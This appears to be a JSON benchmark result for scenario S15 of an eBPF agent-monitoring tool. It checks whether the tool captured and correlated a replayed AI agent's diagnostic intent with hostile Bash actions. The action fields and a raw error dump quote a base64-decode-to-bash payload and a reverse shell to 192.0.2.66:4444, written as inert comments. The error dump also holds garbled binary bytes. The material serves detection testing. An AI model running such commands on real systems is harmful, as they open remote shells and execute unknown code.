@@ -1,0 +1,60 @@
+{
+  "id": "S15",
+  "framework": "ao",
+  "workload": "replay_agent.run (cassette agent loop)",
+  "impl": "eBPF observer + C pipeline (solo, native eBPF)",
+  "platform": "lin-host",
+  "source": "replay",
+  "ts": 1794481296.76948,
+  "note": "real ao solo capture (own eBPF, full native hook set); trace normalized to the AgentSight schema by the bench_exporter node. Correlation parity axis = AgentSight \u00a73.2 engine @500ms over ao's trace; ao's native label correlation is a 2nd column.",
+  "agent_spans": true,
+  "intent_recall": 1.0,
+  "action_recall": 1.0,
+  "edge_recall": 1.0,
+  "scores": {
+    "intent": 2,
+    "action": 2,
+    "corr": 2
+  },
+  "intent_matched": {
+    "diagnos|packet loss|KB": "{\"model\": \"claude-sonnet-5-5\", \"max_tokens\": 2048, \"stream\": false, \"messages\": [{\"role\": \"user\", \"content\": \"R1 has int"
+  },
+  "action_matched": {
+    "base64": "/usr/bin/bash bash -c true # AGENT-ACTION[S15]: bash -c 'echo BASE64PAYLOAD | base64 -d | bash'",
+    "192\\.0\\.2\\.66": "/usr/bin/bash bash -c true # AGENT-ACTION[S15]: bash -i >& /dev/tcp/192.0.2.66/4444 0>&1"
+  },
+  "edges": [
+    {
+      "edge": [
+        "intent:0",
+        "action:0"
+      ],
+      "recovered": true,
+      "why": "both captured, action after intent"
+    }
+  ],
+  "counts": {
+    "llm": 21,
+    "exec": 3,
+    "net": 6
+  },
+  "correlation_error": "UnicodeDecodeError('utf-8', b' 20 -i 0.2 203.0.113.1 | tail -2; ip -s link show eth2; bash -c \\'echo BASE64PAYLOAD | base64 -d | bash\\'; bash -i >& /dev/tcp/192.0.2.66/4444 0>&1\\\\\"}, {\\\\\"type\\\\\": \\\\\"tool_use\\\\\", \\\\\"id\\\\\": \\\\\"toolu_f2f307c4758446fab8a2\\\\\", \\\\\"name\\\\\": \\\\\"Bash\\\\\", \\\\\"input\\\\\": {\\\\\"command\\\\\": \\\\\"true # AGENT-ACTION[S15]: ping -c 20 -i 0.2 203.0.113.1 | tail -2; ip -s link show eth2\\\\\", \\\\\"description\\\\\": \\\\\"S15 step 1\\\\\"}}]}, {\\\\\"role\\\\\": \\\\\"user\\\\\", \\\\\"content\\\\\": [{\\\\\"type\\\\\": \\\\\"tool_result\\\\\", \\\\\"tool_use_id\\\\\": \\\\\"toolu_f2f307c4758446fab8a2\\\\\", \\\\\"content\\\\\": \\\\\"ok\\\\\"}]}, {\\\\\"role\\\\\": \\\\\"assistant\\\\\", \\\\\"content\\\\\": [{\\\\\"type\\\\\": \\\\\"tool_use\\\\\", \\\\\"id\\\\\": \\\\\"toolu_45140e07bb1543839989\\\\\", \\\\\"name\\\\\": \\\\\"Bash\\\\\", \\\\\"input\\\\\": {\\\\\"command\\\\\": \\\\\"true # AGENT-ACTION[S15]: bash -c \\'echo BASE64PAYLOAD | base64 -d | bash\\'\\\\\", \\\\\"description\\\\\": \\\\\"S15 step 2\\\\\"}}]}, {\\\\\"role\\\\\": \\\\\"user\\\\\", \\\\\"content\\\\\": [{\\\\\"type\\\\\": \\\\\"tool_result\\\\\", \\\\\"tool_use_id\\\\\": \\\\\"toolu_45140e07bb1543839989\\\\\", \\\\\"content\\\\\": \\\\\"ok\\\\\"}]}, {\\\\\"role\\\\\": \\\\\"assistant\\\\\", \\\\\"content\\\\\": [{\\\\\"type\\\\\": \\\\\"tool_use\\\\\", \\\\\"id\\\\\": \\\\\"toolu_e7300602b961409e9f8b\\\\\", \\\\\"name\\\\\": \\\\\"Bash\\\\\", \\\\\"input\\\\\": {\\\\\"command\\\\\": \\\\\"true # AGENT-ACTION[S15]: bash -i >& /dev/tcp/192.0.2.66/4444 0>&1\\\\\", \\\\\"description\\\\\": \\\\\"S15 step 3\\\\\"}}]}, {\\\\\"role\\\\\": \\\\\"user\\\\\", \\\\\"content\\\\\": [{\\\\\"type\\\\\": \\\\\"tool_result\\\\\", \\\\\"tool_use_id\\\\\": \\\\\"toolu_e7300602b961409e9f8b\\\\\", \\\\\"content\\\\\": \\\\\"ok\\\\\"}]}]}\"}}\\n{\"source\":\"http_parser\",\"comm\":\"ao-netbench-wl\",\"pid\":1035351,\"tid\":1035351,\"timestamp\":1794481307355394072,\"data\":{\"tid\":1035351,\"message_type\":\"response\",\"body\":\"\"}}\\n{\"source\":\"http_parser\",\"comm\":\"ao-netbench-wl\",\"pid\":1035351,\"tid\":1035351,\"timestamp\":1794481307355867483,\"data\":{\"tid\":1035351,\"message_type\":\"response\",\"body\":\"HTTP/1.1 200 OK\\\\r\\\\nServer: BaseHTTP/0.6 Python/3.14.4\\\\r\\\\nDate: Thu, 12 Nov 2026 11:01:47 GMT\\\\r\\\\nContent-Type: application/json\\\\r\\\\nContent-Length: 274\\\\r\\\\n\\\\r\\\\n\\xf1\\xd8\\xc6D\\x87dX\\x87<\\xcdC\\xda\\\\u0011\\x91J\\xa1l\\xfaP\\x8e\\xdd\\\\u000f\\xcf-\\x90X\\x9dnM\\xf0L\\xc3\\x91\\xe9\\x9b\\\\u001a\\xc3h\\x8b@\\xe7\\xbaJ\\x802}\\xe0\\xcf\\xbb\\xf8\\xfb\\xee`\\xe2\\xd6\\xbe6\\x8a\\xf5\\xa1IX_6\\x93\\\\u0003\\xa2-\\x84S\\x8e\\\\u0012Q\\\\u0017\\xf7\\\\u0015.\\xfaLv\\\\r\\\\u0013\\xef\\x92\\x8b9x\\xc4\\x7f\\\\u0014yZ`\\xe2\\xed\\xa4\\xfd\\xb1vN\\x91\\xd5hW~\\xae\\x94\\x8d>~\\xd3\\xfd\\xd9p\\x98K\\xd3\\xb2\\x82\\xfc\\xc8\\xb9\\x92\\x7f\\xbc\\xaa\\xe8\\xb6\\x88R\\x8f\\x927\\xa1N\\xf6\\xdf.\\xfc\\x8c\\x8e\\xa6\\\\u001f\\x91\\xbb\\xafM(\\xa4M\\xd14\\x9fnm\\x85\\xab\\\\u0018+\\xd6\\\\t\\xdc.\\xd2\\xd6\"}}\\n{\"source\":\"http_parser\",\"comm\":\"ao-netbench-wl\",\"pid\":1035351,\"tid\":1035351,\"timestamp\":1794481307355981432,\"data\":{\"tid\":1035351,\"message_type\":\"response\",\"body\":\"{\\\\\"id\\\\\": \\\\\"msg_4950395b2ebd41c2842b7c35\\\\\", \\\\\"type\\\\\": \\\\\"message\\\\\", \\\\\"role\\\\\": \\\\\"assistant\\\\\", \\\\\"model\\\\\": \\\\\"claude-sonnet-5-5\\\\\", \\\\\"content\\\\\": [{\\\\\"type\\\\\": \\\\\"text\\\\\", \\\\\"text\\\\\": \\\\\"Done: S15 complete.\\\\\"}], \\\\\"stop_reason\\\\\": \\\\\"end_turn\\\\\", \\\\\"stop_sequence\\\\\": null, \\\\\"usage\\\\\": {\\\\\"input_tokens\\\\\": 1000, \\\\\"output_tokens\\\\\": 50}}R\\x8f\\x927\\xa1N\\xf6\\xdf.\\xfc\\x8c\\x8e\\xa6\\\\u001f\\x91\\xbb\\xafM(\\xa4M\\xd14\\x9fnm\\x85\\xab\\\\u0018+\\xd6\\\\t\\xdc.\\xd2\\xd6\"}}\\n', 1816, 1817, 'invalid continuation byte')",
+  "correlation_ao_native": {
+    "mechanism": "ao trace_correlator: tool-call label (exact) else timeline/process-tree; attribution read from ebpf_events.trace_id/match_method (no time window imposed)",
+    "edge_recall": 1.0,
+    "corr_band": 2,
+    "edges": [
+      {
+        "edge": [
+          "intent:0",
+          "action:0"
+        ],
+        "recovered": true,
+        "why": "action attributed to the agent's trace (ao correlator)",
+        "method": "label"
+      }
+    ]
+  },
+  "passed": true,
+  "superseded": "pre-SSL_*_ex-fix run (2026-11-12): ao's ssl.bpf.c sized SSL_read_ex/SSL_write_ex payloads by the requested buffer size (stale tail bytes, actual_bytes=1); superseded by the fixed-probe run."
+}
